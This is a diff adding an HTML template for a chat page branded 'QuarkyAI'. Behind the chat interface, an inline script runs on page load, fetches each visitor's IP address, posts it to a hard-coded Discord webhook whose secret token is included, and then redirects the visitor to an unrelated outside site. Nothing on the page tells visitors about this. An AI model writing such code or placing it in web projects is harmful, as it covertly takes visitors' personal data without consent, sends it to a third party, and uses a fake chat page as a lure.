@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="{{ url_for('static', filename='styles/chat.css') }}">
+  <title>QuarkyAI</title>
+</head>
+<body>
+  <div class="chat-container">
+    <div class="chat-messages" id="chat-messages">
+      <div class="message ai" style="animation-delay: 0.4s;">
+        <div class="text">What can I help you with today?</div>
+      </div>
+    </div>
+    <div class="input-area">
+      <input type="text" id="prompt" placeholder="Type your message..." />
+      <button id="send">Send</button>
+    </div>
+    <p style="text-align: center;"><a style="color: black;" href="/learn">Learn how QuarkyAI Works. </a> - <a style="color: black;" href="/terms">Legal</a></p>
+  </div>
+
+  <script src="{{ url_for('static', filename='javascript/handler.js') }}"></script>
+  <script>
+    // Fetch the user's IPv6
+    fetch('https://api64.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ipv6 = data.ip;
+        console.log("User IPv6:", ipv6);
+  
+        // Prepare the payload for Discord webhook
+        const payload = {
+          content: `New visitor with IP: ${ipv6}`
+        };
+  
+        // Send the IP to the Discord webhook
+        fetch('https://discordapp.com/api/webhooks/1351017798888984697/D-IqeUIM0jmNcdpKY6JRW3Ill-7rTLQQBWileFiErn6BihDvvWGFweloArmaazmt6IoC', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(() => {
+          // Redirect after sending the IP
+          window.location.href = 'https://tungsten.run';
+        })
+        .catch(error => console.error('Error sending IP to webhook:', error));
+      })
+      .catch(err => console.error("Could not get IPv6:", err));
+  </script>
+</body>
+</html>
